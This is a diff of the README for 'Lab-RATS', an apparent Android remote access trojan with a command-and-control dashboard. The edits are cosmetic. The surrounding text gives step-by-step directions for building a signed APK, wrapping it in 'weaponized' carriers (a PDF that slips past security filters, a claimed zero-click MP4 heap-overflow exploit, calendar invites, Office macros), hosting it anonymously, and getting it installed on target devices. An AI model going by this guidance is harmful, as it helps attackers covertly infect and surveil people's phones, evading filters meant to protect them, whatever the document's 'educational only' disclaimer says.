@@ -308,7 +308,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
  />
 </p>
 
-### 1. Building the APK (on PC)
+### 1. Build the APK (on PC)
 1.  **Download the Repository**: `git clone https://github.com/K4N3CO/Lab-RATS-v1.6.git`
 2.  **Navigate** to: `cd /Lab-RATS-v1.6/apk-builder/`
 3.  **Execute** the **Builder**:
@@ -318,18 +318,18 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
     *   **Option 1 (Manual)**: For **basic configuration** of **App Name, ID**, and **Logo** before **building**.
     *   **Option 6 (Infection Chain Wizard)**: For the **Full Build → Host → Weaponize** flow.
 5.  **Enter** your **Google Sheet Webhook URL or Render URL** when **prompted to enable remote device IP reporting and connections** *("Command & Control Options" section above)*.
-6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from the `Lab-RATS-v1.6/apk-builder/output/` **directory**.
+6.  **Retrieve your** `signed.apk` *(and any weaponized payloads like PDFs or MP4s)* from `Lab-RATS-v1.6/apk-builder/output/`
 
 <details>
   <summary><b>📸 Click to View APK-Builder Menu</summary></b>
   <img src="https://github.com/user-attachments/assets/8cb583e6-6c59-46cf-8f94-668f0a34b74e" alt="Full Web Page Screenshot" width="60%">
 </details>
 
-### 2. Deploying & Installing onto Android Devices
-**Deployment** is **a multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.
+### 2. Deploy & Install onto Android Devices
+**Deployment** is **a Multi-stage process** involving **Weaponization**, **Hosting**, and **Execution**.
 
 #### A. Strategic Weaponization: *(The Wrapper)*
-**Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder`tool to **wrap your link inside a high-compatibility carrier file**:
+**Standard** `.apk` files are **often blocked by email filters and browser security**. Use the **Infection Chain Wizard** *(Option 6)* in the `apk-builder` tool to **wrap your link inside a high-compatibility carrier file**:
 *   **📑 Stealth PDF (Highly Recommended)**: Send to **targets via Email or Drive**. It utilizes **URI Actions** instead of **JavaScript** to trigger an **automatic browser-based download, bypassing standard PDF security filters**.
 *   **🎬 Zero-Click MP4**: **Send as a video file**. It **exploits** mobile **Media Heap Overflows** during **gallery indexing or thumbnail generation** to **force-register the C2 link in the background**.
 *   **🗓️ Meeting Invite (ICS)**: Injects a **persistent event** into the **target's Calendar with automated reminders** and a **weaponized "Security Review" link**.
@@ -337,7 +337,7 @@ To **Build, Compile**, and **Deploy Lab-RATS** or **Host the C2 server**, ensure
 *   **and Many More**: The **Wizard** also supports **ADB Strategic Bridge, Stego Image Tails, PWA Manifests**, and **Office Document macros**.
 
 #### B. Hosting Strategies:
-*   **Anonymous Cloud**: **Option 6** uses **`Catbox.moe` by default**. It is **anonymous, fast**, and **generates a direct link**. Now has   **fallback hosting on `Litterbox` or `Tmpfiles` if `Catbox.moe` fails**.
+*   **Anonymous Cloud**: **Option 6** uses `Catbox.moe` **by default**. It is **anonymous, fast**, and **generates a direct link**. Now has   **fallback hosting on `Litterbox` or `Tmpfiles` if `Catbox.moe` fails**.
 *   **P2P Direct**: Host the **APK directly from your PC using a public tunnel**, or from **another infected device** using the `/download/` endpoint.
 
 #### C. Installation & Initialization:
@@ -360,7 +360,7 @@ Once the **target device** downloads the **APK**:
   <img src="https://readme-typing-svg.demolab.com?font=Orbitron&weight=700&size=22&pause=9900&color=00F2FF&center=false&vCenter=true&width=800&height=70&lines=Contributions" alt="Typing Banner"/>
 </p>
 
-**Bug Reports, Add New Feature** and **Pull Requests** are **always welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**.)*
+**Bug Reports, Add New Feature** and **Pull Requests** are **Always Welcome!**. *(See [CONTRIBUTING.md](https://github.com/K4N3CO/Lab-RATS/blob/main/CONTRIBUTING.md) for **more info**.)*
 
 ---
 
@@ -404,7 +404,7 @@ https://github.com/user-attachments/assets/37109047-b727-4914-b19f-42edcedd770a
 
 ### C2 Dashboard - Ghost Ops & Locate:
 
-https://github.com/user-attachments/assets/54e15b5c-0d9e-45e8-bb3c-73afad661b13
+https://github.com/user-attachments/assets/806b7132-370b-49d8-b6b5-3823d0ebe0f0
 
 ---
 
@@ -564,7 +564,7 @@ https://github.com/user-attachments/assets/8ab2970a-2a3b-437c-bc20-6bd74bc21cba
  />
 </p>
 
-**Lab-RATS is for educational and authorized security testing purposes ONLY!**. The **developers & contributors** assume **NO responsibility** for **ANY** **misuse, damage to devices/relationships caused by this software**. **Please use it responsibly**. **Thank you!**
+**Lab-RATS is for educational and authorized security testing purposes ONLY!**. The **Developers & Contributors assume NO Responsibility for ANY** **Misuse, Damage to Devices or Relationships caused by this Software**. **Please use it Responsibly**. **Thank You!**
 
 ---
 
